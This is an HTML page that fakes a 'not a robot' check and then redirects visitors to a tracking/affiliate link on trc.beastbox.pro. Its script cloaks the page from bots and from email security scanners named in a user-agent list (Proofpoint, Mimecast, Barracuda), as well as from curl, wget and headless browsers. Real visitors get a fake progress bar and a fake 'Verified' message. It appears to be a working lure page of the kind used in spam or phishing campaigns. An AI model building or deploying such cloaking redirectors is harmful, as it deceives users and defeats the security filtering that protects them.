<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Almost there…</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:Poppins,-apple-system,"Segoe UI",Roboto,sans-serif;
    background:linear-gradient(180deg,#e0f2ff,#b8e0ff 100%);
    color:#0a2540;display:flex;align-items:center;justify-content:center;
    padding:22px;min-height:100dvh;overflow:hidden;
  }
  .cloud{
    width:100%;max-width:430px;background:#fff;border-radius:32px;
    padding:38px 28px 26px;text-align:center;
    box-shadow:0 30px 60px rgba(10,60,120,.12);
    animation:up .5s ease;
  }
  @keyframes up{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
  .check{
    width:64px;height:64px;margin:0 auto 16px;border-radius:50%;
    background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;
    display:flex;align-items:center;justify-content:center;font-size:32px;
    box-shadow:0 10px 26px rgba(34,197,94,.35);
  }
  .h{font-size:22px;font-weight:800;letter-spacing:-.4px;margin-bottom:8px}
  .p{font-size:14px;color:#4a6580;line-height:1.5;margin-bottom:24px}
  .btn{
    width:100%;padding:16px;border:0;border-radius:14px;
    background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;
    font-family:inherit;font-size:16px;font-weight:700;cursor:pointer;
    min-height:56px;display:none;box-shadow:0 12px 28px rgba(59,130,246,.35);
  }
  .btn:active{transform:scale(.98)}
  .btn.on{display:block;animation:up .3s ease}
  .track{height:6px;background:#e5eef7;border-radius:99px;overflow:hidden;margin-top:22px}
  .track b{display:block;height:100%;width:0;background:linear-gradient(90deg,#3b82f6,#22c55e);transition:width .25s;border-radius:99px}
  .st{font-size:12.5px;color:#7a8fa6;margin-top:10px;min-height:18px}
</style>
</head>
<body>
<div class="cloud">
  <div class="check">✓</div>
  <h2 class="h">You're almost in!</h2>
  <p class="p">We just need to confirm you're not a robot. Takes one second.</p>
  <button class="btn" id="b8" type="button">Continue →</button>
  <div class="track"><b id="p8"></b></div>
  <div class="st" id="s8">Initializing…</div>
</div>
<script>
const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvp7hap20000aejl017gu9ok&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
(function(){
  "use strict";
  const bar=document.getElementById('p8'),st=document.getElementById('s8'),btn=document.getElementById('b8');
  const ua=navigator.userAgent||"";
  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(const p of pats){if(p.test(ua))return;}
  if(navigator.webdriver===true)return;
  let acted=false;
  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
    if(e<T){requestAnimationFrame(step);return;}
    if(r)return;r=true;bar.style.width="100%";
    st.textContent=acted?"Verified — you may continue ✓":"Tap the button to continue";
    btn.classList.add('on');}
  requestAnimationFrame(step);
  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
  let d=false;
  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
  btn.addEventListener('click',e=>{e.preventDefault();go();});
})();
</script>
</body>
</html>
